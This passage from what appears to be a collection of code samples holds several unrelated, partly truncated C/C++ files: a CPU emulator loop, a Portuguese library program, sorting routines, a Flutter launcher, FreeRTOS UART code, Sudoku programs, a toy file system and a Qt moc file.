0xFF;\t\t// 0xFF = every bit set such that all registers are pushed to hardware stack\r\n\t\t\t\t\tpushToStack(&cpuReg.S);\r\n\t\t\t\t\tcpuReg.CC.I = true;\r\n\t\t\t\t}\r\n\t\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\t\t\t\tcpuReg.PC = gimeBus->readMemoryWord(VECTOR_IRQ);\r\n\t\t\t}\r\n\t\t\telse if (cpuSoftHalt == CPU_SOFTWARE_HALT_SYNC)\r\n\t\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\t\t}\r\n\t\telse if (assertedInterrupts[INT_RESET])\r\n\t\t{\r\n\t\t\tcpuReg.PC = gimeBus->readMemoryWord(VECTOR_RESET);\r\n\t\t\tassertedInterrupts[INT_RESET] &= ~INT_ASSERT_MASK_RESET;\r\n\t\t\tcpuCyclesTotal += 2;\t\t// RESET interrupt uses 2 CPU cycles to complete\r\n\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_NONE;\r\n\t\t}\r\n\t\t\r\n\t\tif (cpuSoftHalt != CPU_SOFTWARE_HALT_NONE)\r\n\t\t\treturn;\r\n\r\n\t\t// CPU is not halted so here we go! First grab opcode\r\n\t\tdebuggerRegPC = cpuReg.PC;\t\t\t\t// For our Debugger, Preserve the start address of instruction before the PC gets incremented by the handlers\r\n\r\n\r\n\t\tcurOpCode = readByteAtCurPC();\t\t\t// Note: These functions auto-advance the PC by amount of bytes read\r\n\r\n\t\tif ((curOpCode == 0x10) || (curOpCode == 0x11))\r\n\t\t{\r\n\t\t\t// Since this is a double-byte operation, read the next byte and feed the combination to our pointer-grabbing function\r\n\t\t\tcurOpCodeExtra = readByteAtCurPC();\r\n\t\t\textendedOpCodePtrs((curOpCode * 256) + curOpCodeExtra);\r\n\t\t\tcurOpCodeCycleCount = extendedOpCodeObjects.opBaseCycles;\r\n\t\t\tcurOpMnemonic = extendedOpCodeObjects.mnemonicName;\r\n\t\t\tcurAddrMode = (this->*extendedOpCodeObjects.addrModePtr)();\r\n\t\t\tif (curAddrMode == -1)\t\t// Check if invalid instruction. If so, ignore first extended opcode prefix and treat 2nd byte as the actual opcode\r\n\t\t\t{\r\n\t\t\t\tcurOpCode = curOpCodeExtra;\r\n\t\t\t\tcurOpCodeCycleCount = mainOpCodeLookup[curOpCode].opBaseCycles;\r\n\t\t\t\tcurOpMnemonic = mainOpCodeLookup[curOpCode].mnemonicName;\r\n\t\t\t\tcurAddrMode = (this->*mainOpCodeLookup[curOpCode].addrModePtr)();\r\n\t\t\t\tif (curAddrMode == -1)\t\t// Check one last time if we still have invalid opcode, if so abort/return\r\n\t\t\t\t{\r\n\t\t\t\t\tcpuSoftHalt = CPU_SOFTWARE_HALT_OTHER;\r\n\t\t\t\t\tprintf(\"Halted CPU.\\n\");\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t\t(this->*mainOpCodeLookup[curOpCode].execOpPtr)(curAddrMode);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\t(this->*extendedOpCodeObjects.execOpPtr)(curAddrMode);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcurOpCodeCycleCount = mainOpCodeLookup[curOpCode].opBaseCycles;\r\n\t\t\tcurOpMnemonic = mainOpCodeLookup[curOpCode].mnemonicName;\r\n\t\t\t// Next, we call the corresponding address mode function for the current instruction.\r\n\t\t\t// This will either populate our Effective address, or the operand byte(s) needed for the operation.\r\n\t\t\tcurAddrMode = (this->*mainOpCodeLookup[curOpCode].addrModePtr)();\r\n\t\t\tif (curAddrMode",
    "#include <iostream>\n#include <limits>\n#include <cstdio>\n#include <cstring>\nusing namespace std;\n\nvoid opcoes(){\n    cout << \"===============================\" << endl;\n    cout << \"Este \u00e9 o menu da biblioteca.\" << endl;\n    cout << \" 1 . Cadastro.\" << endl;\n    cout << \" 2 . Altera\u00e7\u00e3o.\" << endl;\n    cout << \" 3 . Exclus\u00e3o.\" << endl;\n    cout << \" 4 . Emprestimo.\" << endl;\n    cout << \" 5 . Devolu\u00e7\u00e3o.\" << endl;\n    cout << \" 6 . Consulta de livro.\" << endl;\n    cout << \" 7 . Livros disponiveis.\" << endl;\n    cout << \" 8 . Listagem geral de livros.\" << endl;\n    cout << \" 9 . Sair.\" << endl;\n    cout << \"===============================\" << endl;\n}\n\nint main(){\n\n    struct infoUsuario {\n         char nome[50];\n         char dataEmpr[50];\n         char dataDevo[50];\n    };\n\n    struct livros{\n        int codigo, nPag;\n        char area[30], titulo[100], autor[12], editora[15];\n        bool disponivel = true;\n        int qtdLivros = 0;\n        struct infoUsuario usuario;\n    };\n\n    struct livros liv;\n    int opcao, livrosDispon, codigoE, campo;\n    string nomeUsu, saber;\n    char opc;\n\n    opcoes();\n    FILE *livroscadastrados;\n    FILE *livroscadastradosAux;\n    \n\n    cout << \"Digite qual op\u00e7\u00e3o voc\u00ea deseja!\" << endl;\n    cin >> opcao;\n    \n\n    while(opcao != 9){\n        system(\"cls\");\n        \n        switch(opcao){\n\n            case 1:\n                livroscadastrados = fopen(\"livros_cadastrados.dat\", \"ab+\");\n                if(livroscadastrados == NULL){\n                    cout << \"Arquivo N\u00e3o foi aberto\";\n                    cin.get();\n                    livroscadastrados = fopen(\"livros_cadastrados.dat\", \"wb\");\n                    if(livroscadastrados == NULL){\n                        cout << \"Arquivo N\u00e3o foi aberto\";\n                        break;\n                    }else{\n                        cout << \"arquivo criado com sucesso\";\n                        cin.get();\n                    }\n                }else{\n                    cout << \"Deseja cadastrar um livro? use 'S' para sim e 'N' para n\u00e3o!\" << endl;\n                    cin >> opc;\n                    \n                    while(opc == 'S'){                        \n                        cout << \"Fa\u00e7a o cadastro do livro.\" << endl;\n                        cout << \"Qual codigo de catalogo do livro?\" << endl;\n                        cin >> liv.codigo;\n                        cin.ignore();\n\n                        cout << \"Qual a area desse livro? (Ciencias exatas, Ciencias humanas e Ciencias da saude)\" << endl;\n                        cin.get(liv.area, 29);\n                        cin.ignore(numeric_limits<streamsize>::max(), '\\n'); \n\n                        cout << \"Qual o titulo deste livro?\" << endl;\n                        cin.get(liv.titulo,99);\n                        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\n                        cout << \"Quem \u00e9 o autor deste livro?\" << endl;\n                        cin.get(liv.autor,11);\n                        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\n                        cout << \"Qual a editora deste livro?\" << endl;\n                        cin.get(liv.editora,14);\n                        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\n                        cout << \"Quantas paginas esse livro possui?\" << endl;\n                        cin >> liv.nPag;\n\n                        system(\"cls\");\n                        if(fwrite(&liv, sizeof(struct livros), 1, livroscadastrados) == 1){\n                            cout << \"Registro gravado com sucesso!\" << endl;\n                            cin.get();\n                        }else{\n                            cout << \"Erro ao gravar registro\";\n                            cin.get();\n                        }\n                        cout << \"Deseja cadastrar outro Livro? use 'S' para sim e 'N' para n\u00e3o!\" << endl;\n                        cin >> opc;\n                        \n                    }\n                    fclose(livroscadastrados);\n                }\n                break;\n            case 2:\n                cout << \"Digite o codigo do livro que voc\u00ea deseja alterar.\" << endl;\n                cin >> codigoE;\n                livroscadastrados = fopen(\"livros_cadastrados.dat\", \"rb+\");\n                fread(&liv, sizeof(struct livros), 1 ,livroscadastrados);\n                while(!feof(livroscadastrados)){ \n                    if(codigoE == liv.codigo){\n                        fseek(livroscadastrados, -sizeof(struct livros), SEEK_CUR);\n                        cout << \"Digite qual campo voc\u00ea deseja alterar\" << endl;\n                        cout << \"1 - area, 2 - titulo, 3 - autor, 4 - editora, 5 - numeroPaginas\" << endl;\n                        cin >> campo;\n                        cin.get();\n                        switch (campo) {\n                            case 1:\n                                cout << \"novo valor de area: \";\n                                cin.get(liv.area, 29);\n                                cin.i",
    "#include <iostream>\n\nusing namespace std;\n\nvoid bubbleSort(int arr[], int n) {\n\tfor (int i = 0; i < n - 1; i++) {\n\t\tfor (int j = 0; j < n - i - 1; j++) {\n\t\t\tif (arr[j] > arr[j + 1]) {\n\t\t\t\tint temp = arr[j];\n\t\t\t\tarr[j] = arr[j + 1];\n\t\t\t\tarr[j + 1] = temp;\n\t\t\t}\n\t\t}\n\t}\n}\n\n// A function for splitting an array into two parts\nint partition(int arr[], int low, int high) {\n\tint pivot = arr[high];\n\tint i = (low - 1);\n\n\tfor (int j = low; j <= high - 1; j++) {\n\t\tif (arr[j] <= pivot) {\n\t\t\ti++;\n\t\t\tint temp = arr[i];\n\t\t\tarr[i] = arr[j];\n\t\t\tarr[j] = temp;\n\t\t}\n\t}\n\tint temp = arr[i + 1];\n\tarr[i + 1] = arr[high];\n\tarr[high] = temp;\n\n\treturn (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\tif (low < high) {\n\t\tint pi = partition(arr, low, high);\n\t\tquickSort(arr, low, pi - 1);\n\t\tquickSort(arr, pi + 1, high);\n\t}\n}\n\n// Function for merging two subarrays\nvoid merge(int arr[], int l, int m, int r) {\n\tint n1 = m - l + 1; // The size of the left subarray\n\tint n2 = r - m; // The size of the right subarray\n\n\t// Creating temporary arrays\n\tint* L = new int[n1];\n\tint* R = new int[n2];\n\n\t// Copying data to temporary arrays\n\tfor (int i = 0; i < n1; i++)\n\t\tL[i] = arr[l + i];\n\tfor (int j = 0; j < n2; j++)\n\t\tR[j] = arr[m + 1 + j];\n\n\t// Indexes for the left and right subarrays\n\tint i = 0, j = 0;\n\tint k = l; // Index for the main array arr[]\n\n\t// Merging temporary arrays back into arr[l..r]\n\twhile (i < n1 && j < n2) {\n\t\tif (L[i] <= R[j]) {\n\t\t\tarr[k] = L[i];\n\t\t\ti++;\n\t\t}\n\t\telse {\n\t\t\tarr[k] = R[j];\n\t\t\tj++;\n\t\t}\n\t\tk++;\n\t}\n\n\t// Copy the remaining elements of L[], if there are any\n\twhile (i < n1) {\n\t\tarr[k] = L[i];\n\t\ti++;\n\t\tk++;\n\t}\n\n\t// Copy the remaining elements of R[], if there are any\n\twhile (j < n2) {\n\t\tarr[k] = R[j];\n\t\tj++;\n\t\tk++;\n\t}\n\tdelete[] L;\n\tdelete[] R;\n}\n\nvoid mergeSort(int arr[], int l, int r) {\n\tif (l < r) {\n\t\tint m = l + (r - l) / 2; // Finding the middle of the array\n\t\tmergeSort(arr, l, m); // Recursively sort the left part\n\t\tmergeSort(arr, m + 1, r); // Recursively sort the right part\n\t\tmerge(arr, l, m, r); // Merge the sorted parts\n\t}\n}\n\nint main() {\n\n\tint arr1[] = {64, 34, 25, 12, 22, 11, 90};\n\tint arr2[] = {64, 34, 25, 12, 22, 11, 90};\n\tint arr3[] = {64, 34, 25, 12, 22, 11, 90};\n\tint n = sizeof(arr1) / sizeof(arr1[0]);\n\n\tcout << \"Original array: \";\n\tfor (int i = 0; i < n; i++) {\n\t\tcout << arr1[i] << \" \";\n\t}\n\tcout << endl;\n\n\tbubbleSort(arr1, n);\n\tcout << \"Array after bubble sorting: \";\n\tfor (int i = 0; i < n; i++) {\n\t\tcout << arr1[i] << \" \";\n\t}\n\tcout << endl;\n\n\tquickSort(arr2, 0, n - 1);\n\tcout << \"Array after quick sorting: \";\n\tfor (int i = 0; i < n; i++) {\n\t\tcout << arr2[i] << \" \";\n\t}\n\tcout << endl;\n\n\tmergeSort(arr3, 0, n - 1);\n\tcout << \"Array after merge sorting: \";\n\tfor (int i = 0; i < n; i++) {\n\t\tcout << arr3[i] << \" \";\n\t}\n\tcout << endl;\n\n\treturn 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"statefull_widget\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"NewRosComm.hpp\"\n\n#include \"CRC.hpp\"\n#include \"FreeRTOS.h\"\n#include \"NewRosCommProtocol.hpp\"\n#include \"string.h\"\n\n#if USE_NEW_ROS_COMM\n\n\nnamespace RosComm\n{\n\nRosManager RosManager::managers[NEW_ROS_NUM];\n\n// Helper Function\nRosManager *RosManager::getManager(UART_HandleTypeDef *handle)\n{\n    for (int i = 0; i < NEW_ROS_NUM; ++i)\n    {\n        if (handle == RosManager::managers[i].getUARTHandle())\n            return &RosManager::managers[i];\n    }\n    assertFailed((uint8_t *)__FILE__, __LINE__);\n    // Wrong parameter\n    return nullptr;\n}\n\nvoid RosManager::txTask(void *pvParameters)\n{\n    RosManager *pManager = (RosManager *)pvParameters;\n    uint8_t *pData;\n    uint16_t txSize = 0;\n\n    while (true)\n    {\n        // Is there any pending message\n        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);\n\n        if (not(txSize = pManager->txBuffer.getNextAvailableReadSizeNoCircular()))\n        {\n#if USE_DEBUG\n            pManager->txErrorsCounter[eMISOBufferEmpty]++;\n#endif\n            continue;\n        }\n        ATOMIC_ENTER_CRITICAL();\n        {\n            if ((pData = pManager->txBuffer.enterRead(txSize)) == nullptr)\n            {\n                pManager->txBuffer.exitRead();\n#if USE_DEBUG\n                pManager->txErrorsCounter[eMISOBufferMutipleRead]++;\n#endif\n                continue;\n            }\n            if (HAL_UART_Transmit_DMA(pManager->huart, pData, txSize) == HAL_OK)\n            {\n                __HAL_DMA_DISABLE_IT(pManager->huart->hdmatx, DMA_IT_HT);\n            }\n            else  // Error\n            {\n                HAL_UART_AbortTransmit(pManager->huart);\n                pManager->txBuffer.exitRead();\n#if USE_DEBUG\n                pManager->txErrorsCounter[eHALNotOK]++;\n#endif\n            }\n        }\n        ATOMIC_EXIT_CRITICAL();\n    }\n}\n\nvoid RosManager::rxTask(void *pvParameters)\n{\n    RosManager *pManager = (RosManager *)pvParameters;\n    EPackageStatus packageState;\n\n    while (true)\n    {\n        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);\n        packageState = ePackageComplete;\n        while ((pManager->rxSize = pManager->rxBufferPendingBytes()) && packageState != ePackageHeaderIncomplete &&\n               packageState != ePackagePayLoadIncomplete)\n        {\n            packageState = pManager->updateAndGetNextFrame();\n            if (packageState == ePackageComplete)\n            {\n                pManager->connected         = true;\n                pManager->disConnectCounter = 0;\n                uint8_t protocolID          = pManager->rxFrameBuffer.frame.header.protocolID;\n                uint16_t len                = pManager->rxFrameBuffer.frame.header.dataLen;\n                for (uint8_t j = 0; j < pManager->frameCallbackCounter; j++)\n                {\n                    if (pManager->callbackTable[j].id != protocolID)\n                        continue;\n                    pManager->callbackTable[j].func(pManager->rxFrameBuffer.frame.payLoadCRC16, len, pManager->huart);\n                }\n            }\n// Debug\n#if USE_DEBUG\n            pManager->packageStateCnt[packageState]++;\n            pManager->completePackageReceiveFreq = pManager->packageStateCnt[ePackageComplete] / (xTaskGetTickCount() / 1000.0f);\n            pManager->crcErrorRate = (float)(pManager->packageStateCnt[ePackageCRCError] + pManager->packageStateCnt[ePackageHeaderCRCError]) /\n                                     (pManager->packageStateCnt[ePackageComplete]);\n#endif\n        }\n    }\n}\n\nvoid RosManager::rxTimerFunc(TimerHandle_t xTimer)\n{\n    RosManager *pManager = (RosManager *)(pvTimerGetTimerID(xTimer));\n    bool lastConnected   = pManager->connected;\n    if (++pManager->disConnectCounter > NEW_ROS_RX_TIMEOUT)\n    {\n        pManager->connected         = false;\n        pManager->disConnectCounter = NEW_ROS_RX_TIMEOUT;\n    }\n\n    if (lastConnected && not pManager->connected)\n    {\n        ATOMIC_ENTER_CRITICAL();\n        {\n            HAL_UART_AbortReceive(pManager->huart);\n            HAL_UARTEx_ReceiveToIdle_DMA(pManager->huart, pManager->rosRxCircularBuff, NEW_ROS_RX_BUF_SIZE);\n            pManager->rxRIndex = pManager->rxWIndex = -1;\n        }\n        ATOMIC_EXIT_CRITICAL();\n    }\n}\n\nuint16_t RosManager::rxBufferPendingBytes()\n{\n    uint16_t bytes;\n    ATOMIC_ENTER_CRITICAL();\n    {\n        bytes = (this->rxWIndex - this->rxRIndex + NEW_ROS_RX_BUF_SIZE) % NEW_ROS_RX_BUF_SIZE;\n    }\n    ATOMIC_EXIT_CRITICAL();\n    return bytes;\n}\n\nRosManager::EPackageStatus RosManager::updateAndGetNextFrame()\n{\n    uint16_t size                               = this->rxSize;\n    static constexpr uint16_t CRC16_SIZE        = 2;\n    static constexpr uint16_t HEADER_CRC16_SIZE = sizeof(FrameHeader) + CRC16_SIZE;\n\n    // Find the start byte\n    uint16_t rPtr = this->rxRIndex;\n    while (size > HEADER_CRC16_SIZE)\n    {\n        rPtr = (rPtr + 1) % NEW_ROS_RX_BUF_SIZE;\n        if (rosRxCircularBuff[rPtr] == RosComm::START_BYTE)\n        {\n            break;\n        }\n        size--;\n    }\n\n    // Verify the completeness of",
    "#include \"Grid.h\"\n#include \"GameManager.h\"\n#include \"CommandInvoker.h\"\n#include \"InputCommand.h\"\n#include <iostream>\nusing namespace std;\n\nstd::ostream& bold_on(std::ostream& os) { return os << \"\\e[1m\"; }\n\nstd::ostream& bold_off(std::ostream& os) { return os << \"\\e[0m\"; }\n\nGrid* grid;\nCommandInvoker* invoker;\n\nvoid InfoDisplay()\n{\n    cout <<bold_on <<\"SUDOKU\\n\"<<bold_off;\n    cout << \"Sudoku is played on a grid of 9 x 9 spaces.\\n\";\n    cout << \"Each of the digits 1 - 9 must occur exactly once in each row.\\n\";\n    cout << \"Each of the digits 1 - 9 must occur exactly once in each column.\\n\";\n    cout << \"Each of the digits 1 - 9 must occur exactly once in each of the 9 3x3 sub - boxes of the grid.\\n\";\n\n    cout << \"\\n RULES : \\n\";\n    cout << \"\\n1. Enter '1' to enter value\\n\";\n    cout << \"2. Enter '2' to Undo last step. (You only have 5 undos in a match)\\n\";\n    cout << \"3. Enter '-1' to Exit the Game!\\n\";\n    cout << \"\\n\";\n}\n\nvoid Input()\n{\n    int row, col, value;\n\n    cout << \"\\nEnter row : \";\n    cin >> row;\n    cout << \"\\nEnter col : \";\n    cin >> col;\n    cout << \"\\nEnter value : \";\n    cin >> value;\n\n    if (grid->GetInput(row, col, value))\n    {\n        invoker->ExecuteCommand(row, col, grid->GetCell(row, col)->GetCellValue());\n        grid->GetCell(row, col)->SetCellValue(value);\n    }\n    \n    grid->PrintSudoku();\n}\n\nvoid Undo()\n{\n    InputCommand undo = invoker->UndoCommand();\n\n    if (undo.row == -1 || undo.col == -1 || undo.value == -1)\n        return;\n\n    grid->GetCell(undo.row, undo.col)->SetCellValue(undo.value);\n\n    if (grid->GetCell(undo.row, undo.col)->GetCellValue() == 0)\n        grid->GetCell(undo.row, undo.col)->SetCellState(EMPTY);\n\n    cout << \"\\n UNDO!\\n\";\n    grid->PrintSudoku();\n}\n\n\nint main()\n{\n    InfoDisplay();\n    grid = new Grid();\n    invoker = new CommandInvoker();\n    grid->PrintSudoku();\n    GameManager* manager = new GameManager();\n    manager->SetGameState(PLAY);\n\n    while (manager->GetGameState() == PLAY)\n    {\n        int input;\n        cout << \"\\nEnter command : \";\n        cin >> input;\n\n        switch (input)\n        {\n        case 1: Input();\n            break;\n\n        case 2: Undo();\n            break;\n\n        case -1: manager->SetGameState(OVER);\n            break;\n        }\n    }\n}\n",
    "#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<unistd.h>\r\n#include<unistd.h>\r\n#include<io.h>\r\n#include<string.h>\r\n\r\n#define MAXINODE 50\r\n\r\n#define READ 1\r\n#define WRITE 2\r\n\r\n#define MAXFILESIZE 2048\r\n\r\n#define REGULAR 1\r\n#define SPECIAL 2\r\n\r\n#define START 0\r\n#define CURRENT 1\r\n#define END 2\r\n\r\ntypedef struct superblock\r\n{\r\n    int TotalInodes;\r\n    int FreeInode;\r\n}SUPERBLOCK, *PSUPERBLOCK;\r\n\r\ntypedef struct inode\r\n{\r\n    char FileName[50];\r\n    int InodeNumber;\r\n    int FileSize;\r\n    int FileActualSize;\r\n    int FileType;\r\n    char *Buffer;\r\n    int LinkCount;\r\n    int ReferenceCount;\r\n    int permission;\r\n    struct inode *next;\r\n}INODE,*PINODE,**PPINODE;\r\n\r\ntypedef struct filetable\r\n{\r\n    int readoffset;\r\n    int writeoffset;\r\n    int count;\r\n    int mode;\r\n    PINODE ptrinode;\r\n}FILETABLE,*PFILETABLE;\r\n\r\ntypedef struct ufdt\r\n{\r\n    PFILETABLE ptrfiletable;\r\n}UFDT;\r\n\r\nUFDT UFDTArr[50];\r\nSUPERBLOCK SUPERBLOCKobj;\r\nPINODE head = NULL;\r\n\r\nvoid man(char *name)\r\n{\r\n    if(name==NULL)return;\r\n\r\n    if(strcmp(name,\"create\")==0)\r\n    {\r\n        printf(\"Description : used to create new regular file\\n\");\r\n        printf(\"Usage:create File_name Permission\\n\");\r\n    }\r\n    else if(strcmp(name,\"read\")==0)\r\n    {\r\n        printf(\"Description : used to read data from regular file\\n\");\r\n        printf(\"Usage:read File_name No_Of_Bytes_TO_Read\\n\");\r\n    }\r\n    else if(strcmp(name,\"write\")==0)\r\n    {\r\n        printf(\"Description : used to write into regular file\\n\");\r\n        printf(\"Usage:Write File_name\\n After this enter the data that we want to write\\n\");\r\n    }\r\n    else if(strcmp(name,\"ls\")==0)\r\n    {\r\n        printf(\"Description : used to list all information of files\\n\");\r\n        printf(\"Usage:ls\\n\");\r\n    }\r\n    else if(strcmp(name,\"stat\")==0)\r\n    {\r\n        printf(\"Description : used to display information of file\\n\");\r\n        printf(\"Usage:stat File_name\\n\");\r\n    }\r\n    else if(strcmp(name,\"fstat\")==0)\r\n    {\r\n        printf(\"Description : used to display information of file\\n\");\r\n        printf(\"Usage:stat File_Descriptor\\n\");\r\n    }\r\n    else if(strcmp(name,\"truncate\")==0)\r\n    {\r\n        printf(\"Description : used to remove data from file\\n\");\r\n        printf(\"Usage:truncate File_Name\\n\");\r\n    }\r\n    else if(strcmp(name,\"open\")==0)\r\n    {\r\n        printf(\"Description : used to open existing file\\n\");\r\n        printf(\"Usage:open File_name mode\\n\");\r\n    }\r\n    else if(strcmp(name,\"close\")==0)\r\n    {\r\n        printf(\"Description : used to close opened file\\n\");\r\n        printf(\"Usage:close File_Name\\n\");\r\n    }\r\n    else if(strcmp(name,\"closeall\")==0)\r\n    {\r\n        printf(\"Description : used to close all opened file\\n\");\r\n        printf(\"Usage:closeall\\n\");\r\n    }\r\n    else if(strcmp(name,\"Iseek\")==0)\r\n    {\r\n        printf(\"Description : used to change file offset\\n\");\r\n        printf(\"Usage:Iseek File_Name ChangeInOffset StartPoint\\n\");\r\n    }\r\n    else if(strcmp(name,\"rm\")==0)\r\n    {\r\n        printf(\"Description : used to delete the file\\n\");\r\n        printf(\"Usage:rm File_Name\\n\");\r\n    }\r\n    else\r\n    {\r\n        printf(\"ERROR : No manual entry available.\\n\");\r\n    }\r\n}\r\n\r\nvoid DisplayHelp()\r\n{\r\n    printf(\"ls : To List out all files\\n\");\r\n    printf(\"clear : To clear console\\n\");\r\n    printf(\"open : To open the file\\n\");\r\n    printf(\"close : To close the file\\n\");\r\n    printf(\"closeall : To close all opened files\\n\");\r\n    printf(\"read : To Read the contents from file\\n\");\r\n    printf(\"Write : To write contents into file\\n\");\r\n    printf(\"exit : To Terminate file system\\n\");\r\n    printf(\"stat : To Display information of file using name\\n\");\r\n    printf(\"fstat : To Display information of file using file descriptor\\n\");\r\n    printf(\"truncate : To Remove all data from file\\n\");\r\n    printf(\"rm : To Delete the file\\n\");\r\n}\r\n\r\nint GetFDFromName(char *name)\r\n{\r\n    int i = 0;\r\n\r\n    while(i<50)\r\n    {\r\n        if(UFDTArr[i].ptrfiletable !=NULL)\r\n            if(strcmp((UFDTArr[i].ptrfiletable->ptrinode->FileName),name)==0)\r\n                break;\r\n        i++;\r\n    }\r\n\r\n    if(i==50)   return -1;\r\n    else        return i;\r\n}\r\n\r\nPINODE Get_Inode(char *name)\r\n{\r\n    PINODE temp = head;\r\n    int i =0;\r\n\r\n    if(name==NULL)\r\n        return NULL;\r\n\r\n    while(temp!=NULL)\r\n    {\r\n        if(strcmp(name,temp->FileName)==0)\r\n            break;\r\n        temp =temp ->next;\r\n    }\r\n    return temp;\r\n}\r\n\r\nvoid CreateDILB()\r\n{\r\n    int i=0;\r\n    PINODE newn = NULL;\r\n    PINODE temp=head;\r\n\r\n    while(i<=MAXINODE)\r\n    {\r\n        newn = (PINODE)malloc(sizeof(INODE));\r\n\r\n        newn->LinkCount=0;\r\n        newn->ReferenceCount=0;\r\n        newn->FileType=0;\r\n        newn->FileSize=0;\r\n\r\n        newn->Buffer=NULL;\r\n        newn->next=NULL;\r\n\r\n        newn->InodeNumber = i;\r\n\r\n        if(temp==NULL)\r\n        {\r\n            head=newn;\r\n            temp=head;\r\n        }\r\n        else\r\n        {\r\n            temp->next=newn;\r\n            temp =temp->next;\r\n        }\r\n        i++;\r\n    }\r\n    printf(\"DILB created successf",
    "#include <iostream>\n#include \"sudoku/sudoku.hpp\"\n\nint main() {\n    Sudoku xs(9);\n    \n    std::vector<int16_t> row1{3, 0, 4, 5, 6, 0, 9, 0, 0};\n    std::vector<int16_t> row2{1, 8, 5, 0, 0, 9, 7, 0, 0};\n    std::vector<int16_t> row3{0, 0, 0, 0, 7, 8, 4, 1, 5};\n    std::vector<int16_t> row4{0, 2 ,0, 0, 1, 0, 0, 4, 9};\n    std::vector<int16_t> row5{0, 4, 9, 0, 5, 0, 0, 0, 0};\n    std::vector<int16_t> row6{0, 0, 1, 9, 8, 0, 6, 7, 0};\n    std::vector<int16_t> row7{4, 9, 0, 0, 3, 0, 0, 0, 7};\n    std::vector<int16_t> row8{0, 1, 8, 7, 4, 5, 0, 0, 6};\n    std::vector<int16_t> row9{0, 0, 0, 0, 0, 0, 0, 8, 0};\n\n    xs.set_row(0, std::move(row1));\n    xs.set_row(1, std::move(row2));\n    xs.set_row(2, std::move(row3));\n    xs.set_row(3, std::move(row4));\n    xs.set_row(4, std::move(row5));\n    xs.set_row(5, std::move(row6));\n    xs.set_row(6, std::move(row7));\n    xs.set_row(7, std::move(row8));\n    xs.set_row(8, std::move(row9));\n\n    std::cout << \"Sudoku before optimization:  \" << std::endl;\n    std::cout << \"Total number of duplicates are: \" << xs.total_cost() << std::endl;\n    xs.print_sudoku();\n\n\n    std::cout << \"Press enter to start optimization: \";\n    std::cin.ignore();\n    \n    xs.sa_optimization(100, 0.01, 0.99, 100000);\n\n    std::cout << \"Sudoku after optimization:  \" << std::endl;\n    std::cout << \"Total number of duplicates are: \" << xs.total_cost() << std::endl;\n    xs.print_sudoku();\n}",
    "/****************************************************************************\n** Meta object code from reading C++ file 'MemoryScanner.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.7.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../../../MemoryScanner/MemoryScanner.h\"\n#include <QtGui/qtextcursor.h>\n#include <QtCore/qmetatype.h>\n\n#include <QtCore/qtmochelpers.h>\n\n#include <memory>\n\n\n#include <QtCore/qxptype_traits.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'MemoryScanner.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.7.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSMemoryScannerENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSMemoryScannerENDCLASS = QtMocHelpers::stringData(\n    \"MemoryScanner\",\n    \"scanMemory\",\n    \"\",\n    \"saveResults\",\n    \"loadResults\"\n);\n#else  // !QT_MOC_HAS_STRINGDATA\n#error \"qtmochelpers.h not found or too old.\"\n#endif // !QT_MOC_HAS_STRINGDATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSMemoryScannerENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       3,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   32,    2, 0x08,    1 /* Private */,\n       3,    0,   33,    2, 0x08,    2 /* Private */,\n       4,    0,   34,    2, 0x08,    3 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject 